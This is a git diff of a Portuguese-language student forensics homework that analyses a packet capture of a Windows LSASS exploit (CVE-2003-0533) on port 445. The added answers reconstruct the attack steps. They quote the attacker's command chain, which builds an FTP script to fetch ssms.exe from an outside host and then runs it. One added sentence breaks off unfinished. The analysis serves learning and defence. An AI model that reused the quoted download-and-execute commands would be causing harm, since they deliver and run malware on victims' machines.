@@ -202,17 +202,38 @@ windows
 
 Como sabemos que a vítima deveria ser uma máquina windows, o atacante está tentando atacar
 alguma vulnerabilidade do Microsoft-DS Active Directory, Windows shares, já que está
-atacando a porta 445.
+atacando a porta 445. Pesquisando mais sobre o 
 
 ## Questão 6) Esboce graficamente uma visão geral das ações realizadas pelo atacante (considere a topologia de rede, os passos do ataque, os resultados).
 
+1. Atacante identifica que a porta 445 da vítima está aberta
+2. Atacante estabelece uma sessão com usuário NULL.
+3. Atacante explora a vulnerabilidade usando a função DsRoleUpgradeDownlevelServer() (
+visível nos pacotes pelo tcpdump) passando como parâmetro o código malicioso.
+4. Código malicioso inicia conexão na porta 1957
+5. Atacante se conecta a essa porta e faz o download do malware na máquina da vítima.
+possível ver com essa sequência de comandos `tcpflow -r attack-trace.pcap; file *; less 
+098.114.205.102.01924-192.150.011.111.01957`. O malware foi baixado com o seguinte comando
+`echo open 0.0.0.0 8884 > o&
+echo user 1 1 >> o &
+echo get ssms.exe >> o &
+echo quit >> o &
+ftp -n -s:o &
+del /F /Q o &ssms.exe`
+6. Atacante executa malware na máquina da vítima.
+
 ## Questão 7) Que vulnerabilidade específica foi explorada (CVE, propriedades de segurança violadas, como ela ocorre, etc.)?
+
+Foi explorada a vulnerabilidade CVE-2003-0533. A vulnerabilidade consiste em um stack 
+overflow em algumas funções do serviço explorado. Executando uma função específica é
+possível o atacante executar um código malicioso no sistema da vítima. Esse ataque viola
+o princípio da integridade, já que executa um código sem autorização.
 
 ## Questão 8) O que a shellcode faz? Liste a shellcode (código).
 
 Muito provável que a shellcode faça um tcp reverso, já que após algumas mensagens da forma
 `atacante -> vítima` começam a ser feitas mensagens da forma `vítima -> atacante`,
-incluindo um inícion de sessão tcp (syn, syn ack, ack).
+incluindo um início de sessão tcp (syn, syn ack, ack).
 
 Não consegui obter o shellcode em si, mas sei que é possível obte-lo a partir da saída do
 comando `tcpdump -vvv -n -r attack-trace.pcap`.
@@ -224,6 +245,8 @@ uma máquina linux, assim fomentando a teoria de ser uma máquina linux com uma 
 virtual windows de honeypot.
 
 ## Questão 10) Houve código malicioso envolvido? Se sim, qual o nome/rótulo do malware?
+
+Sim. Foi descoberto o ssms.exe nas questões anteriores. Esse código sendo o malware.
 
 ## Questão 11) Você acha que o ataque foi manual ou lançado de maneira automática? Justifique sua resposta.
 
